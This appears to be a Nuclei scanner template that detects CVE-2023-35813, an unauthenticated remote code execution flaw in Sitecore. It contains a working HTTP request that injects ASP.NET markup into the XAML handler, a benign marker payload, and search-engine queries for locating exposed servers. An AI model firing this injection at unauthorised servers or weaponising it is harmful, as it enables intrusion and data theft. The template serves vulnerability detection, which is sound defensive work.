http:
- matchers:
  - condition: and
    dsl:
    - contains(content_type, '{{string}}')
    - contains_all(body, 'commands', 'command', 'value')
    - status_code == 200
    type: dsl
  raw:
  - 'POST /sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    __ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl("{{url_encode(payload)}}")

    '
id: CVE-2023-35813
info:
  author: DhiyaneshDk,iamnoooob
  classification:
    cpe: cpe:2.3:a:sitecore:experience_commerce:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-35813
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-22,CWE-23
    epss-percentile: 0.99814
    epss-score: 0.93522
  description: 'Multiple Sitecore products allow remote code execution. This affects
    Experience Manager, Experience Platform, and Experience Commerce through 10.3.

    '
  impact: 'Unauthenticated attackers can execute arbitrary code on Sitecore servers
    through the XAML parser by injecting malicious ASP.NET markup, potentially compromising
    the entire content management system and accessing sensitive customer data.

    '
  metadata:
    fofa-query: title="sitecore"
    google-query: intitle:"sitecore"
    max-request: 1
    product: experience_commerce
    shodan-query:
    - title:"Sitecore"
    - http.title:"sitecore"
    vendor: sitecore
  name: Sitecore - Remote Code Execution
  reference:
  - https://support.sitecore.com/kb?id=kb_article_view\u0026sysparm_article=KB1002979
  - https://code-white.com/blog/exploiting-asp.net-templateparser-part-1/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-35813
  - https://support.sitecore.com/kb?id=kb_article_view&sysparm_article=KB1002979
  - https://github.com/BagheeraAltered/CVE-2023-35813-PoC
  remediation: 'Apply Sitecore security patches as outlined in KB1002979 for Experience
    Manager, Experience Platform, and Experience Commerce versions through 10.3.

    '
  severity: critical
  tags: cve2023,cve,sitecore,rce,vkev,vuln
variables:
  payload: "<%@Register\n    TagPrefix = 'x'\n    Namespace = 'System.Runtime.Remoting.Services'\n\
    \    Assembly = 'System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'\n\
    %>\n<x:RemotingService runat='server'\n    Context-Response-ContentType='{{string}}'\n\
    />\n"
  string: '{{rand_base(6)}}'
